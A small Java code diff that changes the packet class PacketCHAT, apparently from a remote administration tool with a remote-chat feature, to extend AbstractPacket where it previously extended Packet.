@@ -11,7 +11,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameRemoteChat;
 
 
-public class PacketCHAT extends Packet {
+public class PacketCHAT extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
